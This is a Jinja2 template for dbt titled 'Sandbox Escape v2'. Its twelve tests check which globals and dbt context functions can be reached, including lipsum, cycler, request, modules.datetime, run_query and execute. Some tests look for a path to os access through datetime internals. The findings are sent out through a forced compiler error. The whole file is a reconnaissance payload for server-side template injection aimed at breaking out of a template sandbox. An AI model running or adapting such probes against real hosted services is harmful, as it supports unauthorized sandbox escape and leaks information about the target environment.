{# Sandbox Escape v2 - alternative introspection #}
{% set ns = namespace(output='[ESCAPE2] ') %}

{# Test 1: Can we access lipsum (Jinja2 built-in global)? #}
{% if lipsum is defined %}
  {% set ns.output = ns.output ~ 'lipsum=YES' %}
{% else %}
  {% set ns.output = ns.output ~ 'lipsum=NO' %}
{% endif %}

{# Test 2: Can we access cycler? #}
{% if cycler is defined %}
  {% set ns.output = ns.output ~ ' | cycler=YES' %}
{% else %}
  {% set ns.output = ns.output ~ ' | cycler=NO' %}
{% endif %}

{# Test 3: Can we access joiner? #}
{% if joiner is defined %}
  {% set ns.output = ns.output ~ ' | joiner=YES' %}
{% else %}
  {% set ns.output = ns.output ~ ' | joiner=NO' %}
{% endif %}

{# Test 4: Direct string format trick #}
{% set ns.output = ns.output ~ ' | format_test=' ~ '%s'|format('hello') %}

{# Test 5: Try accessing request (Flask) #}
{% if request is defined %}
  {% set ns.output = ns.output ~ ' | request=YES' %}
{% else %}
  {% set ns.output = ns.output ~ ' | request=NO' %}
{% endif %}

{# Test 6: Try using map/select filters with attribute access #}
{% set test_list = [{'a': 1}, {'a': 2}] %}
{% set ns.output = ns.output ~ ' | map_test=' ~ test_list | map(attribute='a') | list | string %}

{# Test 7: Try modules.datetime for os access #}
{% set dt = modules.datetime %}
{% set now = dt.datetime.now() %}
{% set ns.output = ns.output ~ ' | time=' ~ now | string %}

{# Test 8: Check if we can reach os via datetime internals #}
{% set ns.output = ns.output ~ ' | dt_dir_type=' ~ dt.datetime | string | truncate(100) %}

{# Test 9: Try run_query #}
{% if run_query is defined %}
  {% set ns.output = ns.output ~ ' | run_query=YES' %}
{% else %}
  {% set ns.output = ns.output ~ ' | run_query=NO' %}
{% endif %}

{# Test 10: Try execute #}
{% if execute is defined %}
  {% set ns.output = ns.output ~ ' | execute=' ~ execute %}
{% endif %}

{# Test 11: Try local_md5 #}
{% if local_md5 is defined %}
  {% set ns.output = ns.output ~ ' | local_md5=YES' %}
{% else %}
  {% set ns.output = ns.output ~ ' | local_md5=NO' %}
{% endif %}

{# Test 12: Available dbt context functions #}
{% set funcs = [] %}
{% if ref is defined %}{% do funcs.append('ref') %}{% endif %}
{% if source is defined %}{% do funcs.append('source') %}{% endif %}
{% if config is defined %}{% do funcs.append('config') %}{% endif %}
{% if log is defined %}{% do funcs.append('log') %}{% endif %}
{% if return is defined %}{% do funcs.append('return') %}{% endif %}
{% if fromjson is defined %}{% do funcs.append('fromjson') %}{% endif %}
{% if tojson is defined %}{% do funcs.append('tojson') %}{% endif %}
{% if fromyaml is defined %}{% do funcs.append('fromyaml') %}{% endif %}
{% if toyaml is defined %}{% do funcs.append('toyaml') %}{% endif %}
{% if set_sql_header is defined %}{% do funcs.append('set_sql_header') %}{% endif %}
{% if zip is defined %}{% do funcs.append('zip') %}{% endif %}
{% if invocation_id is defined %}{% do funcs.append('invocation_id') %}{% endif %}
{% if flags is defined %}{% do funcs.append('flags') %}{% endif %}
{% set ns.output = ns.output ~ ' | dbt_funcs=' ~ funcs | join(',') %}

{{ exceptions.raise_compiler_error(ns.output) }}
